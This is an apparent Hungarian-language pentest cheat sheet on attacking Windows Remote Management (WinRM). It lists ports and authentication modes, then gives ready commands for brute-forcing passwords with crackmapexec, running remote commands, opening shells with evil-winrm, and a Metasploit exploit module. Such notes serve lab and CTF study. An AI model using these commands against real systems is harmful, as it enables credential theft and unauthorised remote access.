# winrm
## info
* alapbol nincs engedelyezve  
* es kulon be kell konfiguralni windows-on ahhoz hogy mukodjon rajta  
* remote access protocol over HTTP or HTTPS  
* tcp/5985,5986  
* Default top 1000 nmap scan nem mutatja  
* Http api ez a banner nmapnal  
* Command futtatasra lehet alapvetoen hasznalni
* /wsman -> ez a default url, amin fut
## auth modes
* Uername + password
* username + password hash  
## bruteforcing credentials
crackmapexec winrm 10.10.10.1 -u administrator -p passwords.txt
## run commands
crackmapexec winrm 10.10.10.1 -u administrator -p pass123 -x "whoami"
## shell access
### evil-winrm ruby script
evil-winrm.rb -u administrator -p 'pass123' -i 10.10.10.1
### metasploit
use /exploit/windows/winrm_script_exec  
set force_vbs true //lehet hogy erre szukseg lesz, lehet hogy nem  
probalkozhatunk staged vagy stageless payload-al
